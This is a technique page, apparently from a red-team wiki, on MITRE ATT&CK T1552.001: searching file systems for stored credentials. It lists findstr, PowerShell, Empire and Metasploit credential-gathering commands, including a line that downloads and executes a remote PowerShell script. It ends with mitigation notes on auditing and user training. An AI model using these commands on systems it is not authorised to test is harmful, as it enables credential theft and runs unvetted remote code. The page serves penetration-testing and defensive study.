---
description: https://attack.mitre.org/techniques/T1552/001/
---

# Credentials In Files

**ATT\&CK ID:** [T1552.001](https://attack.mitre.org/techniques/T1552/001/)

**Permissions Required:** <mark style="color:orange;">**Various**</mark>

**Description**

Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.

## Techniques

### CMD

```bash
# Running these commands in the root of c:\ can produce enourmouse output.

findstr /si pass *.xml *.doc *.txt *.xls
findstr /si cred *.xml *.doc *.txt *.xls
```

![](../../../../.gitbook/assets/findstr-passwords.png)

### Empire

```
powershell/collection/file_finder
powershell/collection/find_interesting_file
powershell/credentials/sessiongopher
```

![](<../../../../.gitbook/assets/image (125) (2).png>)

### Metasploit

```bash
# Meterpreter

# Search by file name from parent directory
search -d <Directory> -f <File>
search -d c:\\shares -f *password*

# Modules

use post/windows/gather/enum_unattend
use post/windows/gather/credentials/chrome
use post/windows/gather/credentials/gpp
use post/windows/gather/enum_files

# Search all modules
search post/windows/gather/credentials
```

![post/windows/gather/enum\_files](<../../../../.gitbook/assets/image (538).png>)

### PowerShell

```powershell
ls -R | select-string -Pattern password
```

![](../../../../.gitbook/assets/Powershell-String-Search.png)

### SessionGopher

```powershell
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
sessionGopher -noninteractive -consoleoutput
```

## Mitigation

### Auditing

Through the same or similar methods used in discovery of credentials within files, defenders can identify credential information left on systems and file shares.

### User Training

It is difficult to enact technical controls that mitigate the issue of unsecured credentials within files. Users often leave excel spreadsheets full of passwords on shares and desktops without any protection mechanisms.

It is paramount as a preventative measure to provide end users with training on how to securely store credentials and to understand how unsecured credentials can lead to further compromise of systems and data.
